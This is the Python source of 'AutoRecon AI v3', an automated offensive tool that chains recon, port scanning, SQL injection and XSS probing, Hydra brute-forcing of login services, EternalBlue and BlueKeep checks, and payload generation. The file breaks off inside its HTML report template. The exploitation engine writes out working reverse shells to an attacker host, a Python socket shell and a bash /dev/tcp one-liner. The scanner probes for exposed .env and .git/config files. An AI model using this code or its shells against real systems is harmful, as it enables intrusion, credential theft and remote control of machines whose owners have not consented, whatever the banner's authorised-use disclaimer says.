#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   █████╗ ██╗   ██╗████████╗ ██████╗ ██████╗ ███████╗ ██████╗ ██╗   ██╗
║  ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝██╔═══██╗██║   ██║
║  ███████║██║   ██║   ██║   ██║   ██║██████╔╝█████╗  ██║   ██║██║   ██║
║  ██╔══██║██║   ██║   ██║   ██║   ██║██╔══██╗██╔══╝  ██║   ██║██║   ██║
║  ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║  ██║███████╗╚██████╔╝╚██████╔╝
║  ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝
║                                                              ║
║   ██╗   ██╗ █████╗  ██████╗████████╗██████╗                 ║
║   ██║   ██║██╔══██╗██╔════╝╚══██╔══╝╚════██╗                ║
║   ██║   ██║███████║██║        ██║    █████╔╝                ║
║   ╚██╗ ██╔╝██╔══██║██║        ██║    ╚═══██╗                ║
║    ╚████╔╝ ██║  ██║╚██████╗   ██║   ██████╔╝                ║
║     ╚═══╝  ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚═════╝                 ║
║                                                              ║
║  🤖 ULTIMATE AI-Powered Exploitation & Recon Engine          ║
║  Version 3.0 | The Phantom Menace                            ║
║                                                              ║
║  Author : ANKIT48274                                         ║
║  GitHub : https://github.com/ANKIT48274/autorecon-ai         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════════╝

FEATURES:
  • 🕸️  Deep Reconnaissance     - Subdomains, DNS, WHOIS, OSINT
  • 🔍  Port & Service Scanning  - Nmap integration
  • 🌐  Web Vulnerability Scan   - SQLi, XSS, LFI, RCE, Headers
  • 📁  Directory Enumeration    - Gobuster, FFUF, Dirb
  • 🔓  Brute Force Engine       - Hydra (SSH/FTP/HTTP/RDP/SMB)
  • 🐚  Auto Exploitation        - Searchsploit, Metasploit
  • 🪟  Windows AD Exploitation  - Impacket, CrackMapExec
  • 🧬  Full Attack Chain        - Recon -> Exploit -> Shell
  • 🤖  AI Deep Analysis         - Claude/OpenAI/Grok API
  • 📊  Professional Reports     - HTML + JSON + PDF

  ⚠️  FOR AUTHORIZED TESTING ONLY!
"""

import asyncio
import concurrent.futures
import html
import ipaddress
import json
import os
import platform
import random
import re
import shlex
import shutil
import signal
import socket
import sqlite3
import ssl
import string
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import urllib.parse
import urllib.request
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.error import URLError
from urllib.request import Request, urlopen

# ─── Rich UI ───
RICH_AVAILABLE = False
try:
    from rich import box, print as rprint
    from rich.align import Align
    from rich.color import Color
    from rich.columns import Columns
    from rich.console import Console, Group
    from rich.layout import Layout
    from rich.live import Live
    from rich.markdown import Markdown
    from rich.panel import Panel
    from rich.progress import (BarColumn, Progress, SpinnerColumn,
                                TextColumn, TimeElapsedColumn)
    from rich.prompt import Confirm, Prompt
    from rich.rule import Rule
    from rich.spinner import Spinner
    from rich.syntax import Syntax
    from rich.table import Table
    from rich.text import Text
    from rich.tree import Tree
    RICH_AVAILABLE = True
except ImportError:
    pass

# ─── Globals ───
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_DIR = f"autorecon_v3_output_{TIMESTAMP}"
THREADS_MAX = 50
TIMEOUT = 10

# ─── Console ───
console = Console(color_system="truecolor") if RICH_AVAILABLE else None

def cprint(msg="", color=None, bold=False, style=""):
    if console:
        s = ""
        if bold: s += "bold "
        if color: s += color
        if style: s += style
        console.print(msg, style=s.strip())
    else:
        print(msg)

def info(msg): cprint(f"  [cyan]⟳[/] {msg}" if console else f"[*] {msg}")
def ok(msg): cprint(f"  [green]✓[/] {msg}" if console else f"[+] {msg}")
def warn(msg): cprint(f"  [yellow]⚠[/] {msg}" if console else f"[!] {msg}")
def err(msg): cprint(f"  [red]✗[/] {msg}" if console else f"[-] {msg}")
def section(title):
    if console: console.rule(f"[cyan]{title}[/]", style="cyan")
    else: print(f"\n{'='*60}\n  {title}\n{'='*60}")

# ─── COLOR CODES ───
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
B = '\033[94m'; C = '\033[96m'; M = '\033[95m'
W = '\033[97m'; DIM = '\033[2m'; BD = '\033[1m'
RS = '\033[0m'

# ═══════════════════════════════════════════════════════════════
#  TOOLKIT CHECK
# ═══════════════════════════════════════════════════════════════

def check_kali_tools():
    tools = {
        "nmap": shutil.which("nmap"),
        "hydra": shutil.which("hydra"),
        "john": shutil.which("john"),
        "sqlmap": shutil.which("sqlmap"),
        "gobuster": shutil.which("gobuster"),
        "ffuf": shutil.which("ffuf"),
        "dirb": shutil.which("dirb"),
        "nc": shutil.which("nc") or shutil.which("netcat"),
        "nikto": shutil.which("nikto"),
        "whatweb": shutil.which("whatweb"),
        "wpscan": shutil.which("wpscan"),
        "searchsploit": shutil.which("searchsploit"),
        "dnsrecon": shutil.which("dnsrecon"),
        "fierce": shutil.which("fierce"),
        "crackmapexec": shutil.which("crackmapexec"),
        "msfconsole": shutil.which("msfconsole"),
        "msfvenom": shutil.which("msfvenom"),
        "smbclient": shutil.which("smbclient"),
    }
    return tools

TOOLS = check_kali_tools()

# ═══════════════════════════════════════════════════════════════
#  COMMAND RUNNER
# ═══════════════════════════════════════════════════════════════

def run_cmd(cmd: list, timeout: int = 120, capture: bool = True) -> tuple:
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors='replace')
        output = result.stdout + result.stderr
        return result.returncode, output.strip()
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"
    except FileNotFoundError:
        return -1, "COMMAND_NOT_FOUND"
    except Exception as e:
        return -1, str(e)


# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════

BANNER_V3 = f"""
{R}{BD}
    ╔══════════════════════════════════════════════════════════╗
    ║  █████╗ ██╗   ██╗████████╗ ██████╗                      ║
    ║  ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗                     ║
    ║  ███████║██║   ██║   ██║   ██║   ██║  {C}v3.0 ULTIMATE{R}        ║
    ║  ██╔══██║██║   ██║   ██║   ██║   ██║                     ║
    ║  ██║  ██║╚██████╔╝   ██║   ╚██████╔╝                     ║
    ║  ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                      ║
    ║                                                          ║
    ║  {BD}{C}Author: ANKIT48274 | GitHub: ANKIT48274/autorecon-ai{RS}{R}       ║
    ║  {DIM}⚡ The ULTIMATE Penetration Testing Engine ⚡{RS}{R}       ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    {DIM}  ⚠  For authorized testing & CTF use only{RS}
{RS}"""


# ═══════════════════════════════════════════════════════════════
#  DATA CLASSES
# ═══════════════════════════════════════════════════════════════

class PortInfo:
    def __init__(self, port: int = 0, service: str = "unknown", version: str = "", protocol: str = "tcp"):
        self.port = port
        self.service = service
        self.version = version
        self.protocol = protocol


# ═══════════════════════════════════════════════════════════════
#  1. INTELLIGENCE GATHERING
# ═══════════════════════════════════════════════════════════════

class IntelligenceGatherer:
    def __init__(self, target: str):
        self.target = target
        self.results = {
            "hostname": target,
            "ips": [],
            "subdomains": [],
            "dns_records": {},
            "whois": "",
            "technologies": [],
            "emails": [],
            "ports": [],
            "directories": [],
        }

    def resolve(self) -> list:
        try:
            addrinfo = socket.getaddrinfo(self.target, None, socket.AF_INET)
            ips = list(set(info[4][0] for info in addrinfo))
            self.results["ips"] = ips
            ok(f"Resolved: {self.target} -> {', '.join(ips)}")
            return ips
        except Exception as e:
            err(f"Resolution failed: {e}")
            return []

    def dns_enum(self):
        info("Enumerating DNS records...")
        if TOOLS.get("dnsrecon"):
            cmd = ["dnsrecon", "-d", self.target, "-t", "std"]
            rc, out = run_cmd(cmd, timeout=60)
            if rc == 0:
                for line in out.split("\n"):
                    if ":" in line:
                        parts = line.split(":", 1)
                        self.results["dns_records"][parts[0].strip()] = parts[1].strip()
                ok(f"DNS records: {len(self.results['dns_records'])} found")
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]:
            cmd = ["dig", "+short", rtype, self.target]
            rc, out = run_cmd(cmd, timeout=10)
            if rc == 0 and out.strip():
                records = [r.strip() for r in out.split("\n") if r.strip()]
                self.results["dns_records"][rtype] = records
                for rec in records[:2]:
                    info(f"  [{rtype}] {rec}")

    def subdomain_enum(self):
        section("🌐 SUBDOMAIN ENUMERATION")
        if TOOLS.get("fierce"):
            info("Running fierce domain scan...")
            cmd = ["fierce", "--domain", self.target, "--subdomains"]
            rc, out = run_cmd(cmd, timeout=120)
            if rc == 0:
                subs = re.findall(r'Found: (.+)', out)
                self.results["subdomains"].extend(subs)
        info("Querying crt.sh for subdomains...")
        try:
            req = Request(f"https://crt.sh/?q=%25.{self.target}&output=json",
                          headers={"User-Agent": "Mozilla/5.0"})
            resp = urlopen(req, timeout=15)
            data = json.loads(resp.read().decode())
            subs = set()
            for entry in data:
                name = entry.get("name_value", "")
                if name:
                    for n in name.split("\n"):
                        if self.target in n.lower() and n not in subs:
                            subs.add(n)
            self.results["subdomains"].extend(list(subs))
            ok(f"crt.sh: {len(subs)} unique subdomains found")
        except Exception as e:
            warn(f"crt.sh query failed: {e}")
        common_subs = ["www", "mail", "admin", "api", "dev", "test", "staging",
                       "vpn", "remote", "webmail", "portal", "cpanel", "blog",
                       "shop", "app", "beta", "cdn", "docs", "support"]
        found = []
        for sub in common_subs:
            try:
                host = f"{sub}.{self.target}"
                ip = socket.gethostbyname(host)
                found.append(host)
                self.results["subdomains"].append(host)
            except:
                pass
        if found:
            ok(f"Common subdomains alive: {', '.join(found[:8])}")
        self.results["subdomains"] = list(set(self.results["subdomains"]))
        if self.results["subdomains"]:
            ok(f"Total subdomains: {len(self.results['subdomains'])}")
            for s in self.results["subdomains"][:12]:
                info(f"  ├─ {s}")
            if len(self.results["subdomains"]) > 12:
                info(f"  └─ ...and {len(self.results['subdomains'])-12} more")

    def port_scan(self, scan_type: str = "quick"):
        section("🔍 PORT SCANNING")
        if not TOOLS.get("nmap"):
            err("nmap not found!")
            return []
        ip = self.results["ips"][0] if self.results["ips"] else self.target
        if scan_type == "quick":
            cmd = ["nmap", "-sS", "-sV", "--top-ports", "1000", "-T4", "--open", ip,
                   "-oN", f"{OUTPUT_DIR}/nmap_quick.txt", "-oX", f"{OUTPUT_DIR}/nmap_quick.xml"]
            label = "Quick (top 1000 ports)"
        elif scan_type == "full":
            cmd = ["nmap", "-sS", "-sV", "-sC", "-p-", "-T4", "--open", ip,
                   "-oN", f"{OUTPUT_DIR}/nmap_full.txt", "-oX", f"{OUTPUT_DIR}/nmap_full.xml"]
            label = "FULL (all 65535 ports)"
        elif scan_type == "vuln":
            cmd = ["nmap", "-sV", "--script", "vuln", ip,
                   "-oN", f"{OUTPUT_DIR}/nmap_vuln.txt", "-oX", f"{OUTPUT_DIR}/nmap_vuln.xml"]
            label = "VULN (NSE vuln scripts)"
        else:
            cmd = ["nmap", "-sS", "-sV", "-T2", "--top-ports", "500", "--open", ip,
                   "-oN", f"{OUTPUT_DIR}/nmap_stealth.txt", "-oX", f"{OUTPUT_DIR}/nmap_stealth.xml"]
            label = "Stealth"
        info(f"Running Nmap {label} scan on {ip}...")
        rc, out = run_cmd(cmd, timeout=600)
        if rc == 0:
            ok("Nmap scan complete!")
            ports_raw = re.findall(r'^(\d+)/tcp\s+open\s+(\S+)\s+(.*)$', out, re.MULTILINE)
            for port, svc, ver in ports_raw:
                self.results["ports"].append({
                    "port": int(port), "service": svc, "version": ver.strip(), "protocol": "tcp"
                })
            self.results["ports"] = sorted(self.results["ports"], key=lambda x: x["port"])
            ok(f"Open ports: {len(self.results['ports'])}")
            for p in self.results["ports"][:20]:
                info(f"  ├─ {p['port']}/tcp  {p['service']:12} {p['version'][:40]}")
            if len(self.results["ports"]) > 20:
                info(f"  └─ ...and {len(self.results['ports'])-20} more")
        else:
            err(f"Nmap failed: {out[:200]}")
        return self.results["ports"]

    def web_tech_detect(self):
        section("🌐 WEB TECHNOLOGY DETECTION")
        web_ports = [p for p in self.results.get("ports", []) if p["service"] in
                     ("http", "https", "http-proxy", "http-alt", "https-alt")]
        if not web_ports:
            web_ports = [p for p in self.results.get("ports", []) if p["port"] in (80, 443, 8080, 8443)]
        if not web_ports:
            info("No web services detected")
            return
        for p in web_ports:
            port = p["port"]
            proto = "https" if port in (443, 8443, 9443) else "http"
            url = f"{proto}://{self.target}:{port}" if port not in (80, 443) else f"{proto}://{self.target}"
            info(f"Checking {url}...")
            if TOOLS.get("whatweb"):
                cmd = ["whatweb", "-a", "3", "--no-errors", url]
                rc, out2 = run_cmd(cmd, timeout=30)
                if rc == 0 and out2.strip():
                    techs = out2.replace(url, "").strip().strip(",").strip()
                    self.results["technologies"].append({"url": url, "tech": techs})
                    info(f"  ─ {GREEN(techs[:80]) if not RICH_AVAILABLE else techs[:80]}")
            try:
                req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
                resp = urlopen(req, timeout=5)
                headers = dict(resp.headers.items())
                server = headers.get("Server", "Unknown")
                title_match = re.search(rb'<title[^>]*>(.*?)</title>', resp.read(8192), re.I | re.S)
                title = title_match.group(1).decode(errors='replace')[:60] if title_match else "N/A"
                info(f"  ─ Server: {server} | Title: {title}")
            except:
                pass

    def dir_enum(self):
        section("📁 DIRECTORY ENUMERATION")
        web_ports = [p for p in self.results.get("ports", []) if p["service"] in ("http", "https")]
        if not web_ports:
            return
        for p in web_ports[:2]:
            port = p["port"]
            proto = "https" if port in (443, 8443) else "http"
            url = f"{proto}://{self.target}:{port}" if port not in (80, 443) else f"{proto}://{self.target}"
            info(f"Enumerating directories on {url}...")
            if TOOLS.get("gobuster"):
                wordlist = "/usr/share/wordlists/dirb/common.txt"
                if not os.path.exists(wordlist):
                    wordlist = "/usr/share/dirb/wordlists/common.txt"
                if os.path.exists(wordlist):
                    outfile = f"{OUTPUT_DIR}/gobuster_{port}.txt"
                    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "50", "-q", "-o", outfile]
                    rc, out2 = run_cmd(cmd, timeout=120)
                    if rc == 0:
                        dirs = re.findall(r'/(\S+)\s+\(Status:\s+\d+\)', out2)
                        for d in dirs:
                            self.results["directories"].append(f"{url}/{d}")
                        ok(f"gobuster: {len(dirs)} directories found")
                        for d in dirs[:15]:
                            info(f"  ├─ /{d}")
                        if len(dirs) > 15:
                            info(f"  └─ ...and {len(dirs)-15} more")
            sensitive = [".git/config", ".env", "robots.txt", "sitemap.xml",
                        "wp-config.php.bak",".htaccess","admin.php","phpinfo.php"]
            for sf in sensitive:
                try:
                    rq = Request(f"{url}/{sf}", method="GET")
                    resp = urlopen(rq, timeout=3)
                    if resp.status == 200:
                        content = resp.read(200).decode(errors='replace')
                        if "404" not in content and len(content) > 20:
                            self.results["directories"].append(f"{url}/{sf}")
                            ok(f"Sensitive file: {url}/{sf}")
                except:
                    pass

    def whois_lookup(self):
        section("📋 WHOIS LOOKUP")
        cmd = ["whois", self.target]
        rc, out = run_cmd(cmd, timeout=15)
        if rc == 0:
            interesting = []
            for line in out.split("\n"):
                l = line.lower()
                if any(k in l for k in ["registrar:", "org:", "email:", "name:","address:"]):
                    interesting.append(line.strip())
            self.results["whois"] = "\n".join(interesting)
            for line in interesting[:10]:
                info(f"  {line}")

    def gather_all(self, scan_mode: str = "quick"):
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self.resolve()
        if self.results["ips"]:
            self.dns_enum()
            self.subdomain_enum()
            self.port_scan(scan_mode)
            self.web_tech_detect()
            self.dir_enum()
            self.whois_lookup()
        return self.results


# ═══════════════════════════════════════════════════════════════
#  2. WEB VULNERABILITY SCANNER
# ═══════════════════════════════════════════════════════════════

class WebVulnScanner:
    def __init__(self, target: str, intelligence: dict):
        self.target = target
        self.intel = intelligence
        self.findings = []

    def sql_injection_scan(self, url: str):
        section("💉 SQL INJECTION SCAN")
        if not TOOLS.get("sqlmap"):
            warn("sqlmap not available!")
            return
        info(f"Running sqlmap on {url}...")
        cmd = ["sqlmap", "-u", url, "--batch", "--crawl=2", "--random-agent",
               "--level=2", "--risk=2", "--output-dir", f"{OUTPUT_DIR}/sqlmap",
               "--tamper=space2comment"]
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output_lines = []
        start = time.time()
        while time.time() - start < 120:
            line = proc.stdout.readline() if proc.stdout else ""
            if not line and proc.poll() is not None:
                break
            if line:
                output_lines.append(line)
                if "Parameter:" in line and "inject" in line:
                    ok(f"SQLi Found: {line.strip()}")
                    self.findings.append({"type": "sqli", "severity": "CRITICAL", "url": url, "detail": line.strip()})
        proc.terminate()

    def xss_scan(self, url: str):
        section("🎯 XSS SCAN")
        info(f"Scanning for XSS on {url}...")
        xss_payloads = ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>",
                        "<svg/onload=alert(1)>", "javascript:alert(1)"]
        if "?" in url:
            base_url, params = url.split("?", 1)
            param_pairs = params.split("&")
            for i, pair in enumerate(param_pairs):
                key = pair.split("=")[0]
                for payload in xss_payloads[:3]:
                    test_params = param_pairs.copy()
                    test_params[i] = f"{key}={urllib.parse.quote(payload)}"
                    test_url = f"{base_url}?{'&'.join(test_params)}"
                    try:
                        r = Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                        resp = urlopen(r, timeout=5)
                        content = resp.read(4096).decode(errors='replace')
                        if payload in content:
                            ok(f"XSS Found: {test_url[:80]}")
                            self.findings.append({"type": "xss", "severity": "HIGH", "url": test_url, "payload": payload})
                            break
                    except:
                        pass

    def web_headers_check(self, url: str):
        section("🔒 WEB SECURITY HEADERS")
        try:
            r = Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urlopen(r, timeout=5)
            headers = dict(resp.headers.items())
            checks = {
                "strict-transport-security": ("HSTS", "HIGH"),
                "content-security-policy": ("CSP", "MEDIUM"),
                "x-frame-options": ("Clickjacking Protection", "MEDIUM"),
                "x-content-type-options": ("MIME-sniffing Protection", "LOW"),
                "referrer-policy": ("Referrer Policy", "LOW"),
                "permissions-policy": ("Permissions Policy", "LOW"),
            }
            for header, (name, sev) in checks.items():
                val = headers.get(header, "MISSING")
                if val == "MISSING":
                    warn(f"  {name} MISSING")
                    self.findings.append({"type": "missing_header", "severity": sev, "header": header, "name": name})
                else:
                    ok(f"  {name}: {val[:50]}")
        except:
            pass

    def nikto_scan(self, url: str):
        section("🔪 NIKTO SCAN")
        if not TOOLS.get("nikto"):
            warn("nikto not available!")
            return
        outfile = f"{OUTPUT_DIR}/nikto.txt"
        info(f"Running nikto on {url}...")
        cmd = ["nikto", "-h", url, "-o", outfile, "-Format", "txt", "-Tuning", "123456789"]
        rc, out = run_cmd(cmd, timeout=180)
        if os.path.exists(outfile):
            with open(outfile) as f:
                content = f.read()
            findings = re.findall(r'\+ (.+)', content)
            for ft in findings[:10]:
                info(f"  ─ {ft}")
                self.findings.append({"type": "nikto", "severity": "MEDIUM", "detail": ft})

    def scan_all(self):
        urls = set()
        for p in self.intel.get("ports", []):
            if p["service"] in ("http","https","http-proxy","http-alt","https-alt"):
                port = p["port"]
                proto = "https" if port in (443,8443,9443) else "http"
                url = f"{proto}://{self.target}" if port in (80,443) else f"{proto}://{self.target}:{port}"
                urls.add(url)
        for d in self.intel.get("directories", []):
            urls.add(d)
        if not urls:
            urls = {f"http://{self.target}", f"https://{self.target}"}
        for url in urls:
            info(f"\nScanning: {url}")
            self.sql_injection_scan(url)
            self.xss_scan(url)
            self.web_headers_check(url)
            self.nikto_scan(url)
        return self.findings


# ═══════════════════════════════════════════════════════════════
#  3. BRUTE FORCE ENGINE
# ═══════════════════════════════════════════════════════════════

class BruteForceEngine:
    def __init__(self, target: str, ports: list, username: str = "", wordlist: str = ""):
        self.target = target
        self.ports = ports
        self.username = username or "admin"
        self.wordlist = wordlist or "/usr/share/wordlists/rockyou.txt.gz"
        self.found_creds = []
        if not os.path.exists(self.wordlist):
            for wl in ["/usr/share/wordlists/rockyou.txt",
                       "/usr/share/wordlists/fasttrack.txt",
                       "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
                       "/usr/share/nmap/nselib/data/passwords.lst"]:
                if os.path.exists(wl):
                    self.wordlist = wl
                    break
        if not os.path.exists(self.wordlist):
            fallback_file = f"{OUTPUT_DIR}/wordlist.txt"
            passwords = ["admin","root","password","123456","admin123","P@ssw0rd",
                        "welcome","letmein","toor","test","guest","ubnt"]
            with open(fallback_file,"w") as f: f.write("\n".join(passwords))
            self.wordlist = fallback_file

    def try_exploit(self, service: str, port: int, username: str = ""):
        if not TOOLS.get("hydra"):
            err("hydra not available!")
            return []
        svc_map = {"ssh":"ssh","ftp":"ftp","http":"http-post-form","https":"https-post-form",
                   "mysql":"mysql","rdp":"rdp","smb":"smb","vnc":"vnc","telnet":"telnet"}
        hydra_svc = svc_map.get(service)
        if not hydra_svc: return []
        info(f"Brute-forcing {service} on port {port} (user: {username})...")
        cmd = ["hydra","-l",username,"-P",self.wordlist,self.target,"-s",str(port),hydra_svc,
               "-t","4","-w","5","-o",f"{OUTPUT_DIR}/hydra_{service}.txt","-I"]
        rc, out = run_cmd(cmd, timeout=300)
        found = []
        if rc == 0:
            for line in out.split("\n"):
                if "password:" in line or "login:" in line:
                    ok(f"[!] CREDENTIALS: {line.strip()}")
                    found.append(line.strip())
                    self.found_creds.append({"service":service,"port":port,"line":line.strip()})
        return found

    def brute_force_all(self, usernames: list = None):
        section("🔓 BRUTE FORCE ATTACK")
        if not usernames:
            us = input(f"  {Y}Username(s) to try [admin]:{RS} ").strip()
            usernames = [u.strip() for u in us.split(",")] if us else ["admin"]
        brute_services = ["ssh","ftp","http","https","mysql","rdp","smb","vnc","telnet"]
        for p in self.ports:
            service = p["service"]
            if service in brute_services:
                for user in usernames[:3]:
                    self.try_exploit(service, p["port"], user)
        if self.found_creds:
            section("✅ CREDENTIALS FOUND!")
            for cred in self.found_creds:
                ok(f"  {cred['service'].upper()}@{cred['port']}: {cred['line']}")
        return self.found_creds


# ═══════════════════════════════════════════════════════════════
#  4. EXPLOITATION ENGINE
# ═══════════════════════════════════════════════════════════════

class ExploitationEngine:
    def __init__(self, target: str, ports: list, credentials: list):
        self.target = target
        self.ports = ports
        self.credentials = credentials
        self.shells = []
        self.lhost = ""
        self.lport = 4444

    def search_exploits(self, service: str, version: str = ""):
        if not TOOLS.get("searchsploit"): return []
        query = f"{service} {version}".strip()
        cmd = ["searchsploit","--json",query]
        rc, out = run_cmd(cmd, timeout=30)
        exploits = []
        if rc == 0:
            try:
                data = json.loads(out)
                for e in data.get("RESULTS_EXPLOIT",[])[:10]:
                    exploits.append({"title":e.get("Title",""),"path":e.get("Path",""),"edb_id":e.get("EDB-ID","")})
            except: pass
        return exploits

    def msfvenom_shell(self, lhost: str, lport: int):
        if not TOOLS.get("msfvenom"):
            return self._manual_payload(lhost, lport)
        outfile = f"{OUTPUT_DIR}/payload.elf"
        cmd = ["msfvenom","-p","linux/x64/shell_reverse_tcp",f"LHOST={lhost}",f"LPORT={lport}",
               "-f","elf","-o",outfile,"--platform","linux","-a","x64","--smallest"]
        info("Generating reverse shell payload...")
        rc, out = run_cmd(cmd, timeout=30)
        if rc == 0 and os.path.exists(outfile):
            ok(f"Payload: {outfile} ({os.path.getsize(outfile)} bytes)")
            return outfile
        return self._manual_payload(lhost, lport)

    def _manual_payload(self, lhost: str, lport: int) -> str:
        py = f"""#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/bash")
"""
        outfile = f"{OUTPUT_DIR}/rev_shell.py"
        with open(outfile,"w") as f: f.write(py)
        os.chmod(outfile,0o755)
        bash_file = f"{OUTPUT_DIR}/rev_shell.sh"
        with open(bash_file,"w") as f: f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n")
        os.chmod(bash_file,0o755)
        ok(f"Reverse shells: {outfile}, {bash_file}")
        return outfile

    def exploit_smb(self):
        section("🪟 SMB EXPLOITATION")
        for p in self.ports:
            if p["service"] in ("smb","netbios-ssn") or p["port"] in (139,445):
                info(f"Checking SMB on port {p['port']}...")
                cmd = ["smbclient","-L",f"//{self.target}/","-N","--timeout","5"]
                rc, out = run_cmd(cmd, timeout=15)
                if "Sharename" in out: ok("SMB shares accessible!")
                if TOOLS.get("crackmapexec"):
                    cmd2 = ["crackmapexec","smb",self.target]
                    rc2, out2 = run_cmd(cmd2, timeout=15)
                    if rc2 == 0: info(f"CME: {out2[:200]}")
                cmd3 = ["nmap","-p",str(p["port"]),"--script","smb-vuln-ms17-010",self.target]
                rc3, out3 = run_cmd(cmd3, timeout=60)
                if "VULNERABLE" in out3:
                    ok("MS17-010 (EternalBlue) VULNERABLE!")
                    self.shells.append({"type":"smb","vuln":"MS17-010 EternalBlue","target":self.target})

    def exploit_rdp(self):
        section("🖥️ RDP CHECK")
        for p in self.ports:
            if p["service"]=="rdp" or p["port"]==3389:
                cmd = ["nmap","-p","3389","--script","rdp-vuln-ms12-020",self.target]
                rc, out = run_cmd(cmd, timeout=60)
                if "VULNERABLE" in out: ok("MS12-020 (RDP) VULNERABLE!")
                cmd2 = ["nmap","-p","3389","--script","rdp-vuln-cve-2019-0708",self.target]
                rc2, out2 = run_cmd(cmd2, timeout=60)
                if "VULNERABLE" in out2:
                    ok("CVE-2019-0708 (BlueKeep) VULNERABLE!")
                    self.shells.append({"type":"rdp","vuln":"BlueKeep CVE-2019-0708"})

    def exploit_all(self, lhost: str = ""):
        section("💥 EXPLOITATION ENGAGED")
        if lhost:
            self.lhost = lhost
            self.lport = int(input(f"  {Y}LHOST port [4444]:{RS} ").strip() or "4444")
            self.msfvenom_shell(self.lhost, self.lport)
        self.exploit_smb()
        self.exploit_rdp()
        section("🔎 EXPLOIT DATABASE SEARCH")
        for p in self.ports[:10]:
            exploits = self.search_exploits(p["service"], p.get("version",""))
            if exploits:
                ok(f"Exploits for {p['service']} {p.get('version','')}:")
                for e in exploits[:5]:
                    info(f"  ─ {e['title'][:100]}")
        return self.shells


# ═══════════════════════════════════════════════════════════════
#  5. REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════

class ReportGenerator:
    @staticmethod
    def generate(intel: dict, web_findings: list, creds: list, exploits: list, duration: float):
        timestamp = datetime.now()
        hostname = intel.get("hostname","unknown")
        safe_name = hostname.replace('.','_')
        filename = f"autorecon_v3_report_{safe_name}_{timestamp.strftime('%Y%m%d_%H%M%S')}.html"

        ports = intel.get("ports",[])
        ports_rows = "".join(f"<tr><td>{p['port']}</td><td>{p['service']}</td><td>{p.get('version','N/A')[:30]}</td></tr>" for p in ports[:30])

        subs = intel.get("subdomains",[])
        subs_html = "".join(f"<div class='sub-item'>{s}</div>" for s in subs[:20])

        dirs = intel.get("directories",[])
        dirs_html = "".join(f"<div class='sub-item'>{d}</div>" for d in dirs[:20])

        findings_html = ""
        for f in web_findings:
            if isinstance(f,dict):
                sev = f.get("severity","INFO")
                color = {"CRITICAL":"#dc3545","HIGH":"#fd7e14","MEDIUM":"#ffc107"}.get(sev,"#28a745")
                findings_html += f"<div style='border-left:4px solid {color};padding:8px;margin:4px 0;background:#1a1a3e'>{sev}: {f.get('detail','')}</div>"

        creds_html = ""
        for c in creds:
            if isinstance(c,dict):
                creds_html += f"<div style='border-left:4px solid #dc3545;padding:8px;margin:4px 0;background:#1a1a3e'>{c.get('service','')}@{c.get('port','')}: {c.get('line','')}</div>"

        exploits_html = ""
        for e in exploits:
            if isinstance(e,dict):
                exploits_html += f"<div style='color:#00ff88'>{e.get('type','')}: {e.get('vuln','')}</div>"

        risk = "MEDIUM"; risk_score = 25
        if creds: risk, risk_score = "CRITICAL", 85
        elif exploits: risk, risk_score = "HIGH", 60
        rc = {"CRITICAL":"#dc3545","HIGH":"#fd7e14","MEDIUM":"#ffc107","LOW":"#28a745"}.get(risk,"#ffc107")

        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>AutoRecon AI v3 — {html.escape(hostname)}</title>
<style>
* {{ margin:0;padding:0;box-sizing:border-box; }}
body {{ font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#0a0a1a;color:#e0e0e0; }}
.header {{ background:linear-gradient(135deg,#0a0a2e,#1a1a4e);padding:40px;text-align:center;border-bottom:2px solid #00ff88; }}
.header h1 {{ color:#00ff88;font-size:2.2em; }}
.header .meta {{ color:#888;margin-top:8px; }}
.container {{ max-width:1200px;margin:0 auto;padding:20px; }}
.card {{ background:#111128;border-radius:12px;padding:24px;margin:16px 0;border:1px solid #222255; }}
.card h2 {{ color:#00ff88;margin-bottom:16px;border-bottom:1px solid #222255;padding-bottom:8px; }}
.badge {{ display:inline-block;padding:8px 24px;border-radius:20px;font-weight:700;font-size:18px;color:white;background:{rc}; }}
.stats {{ display:flex;gap:12px;flex-wrap:wrap;justify-content:center; }}
.stat-box {{ background:#1a1a3e;padding:16px 24px;border-radius:8px;text-align:center;min-width:100px;flex:1; }}
.stat-num {{ font-size:2em;font-weight:700;color:#00ff88; }}
.stat-label {{ font-size:13px;color:#888; }}
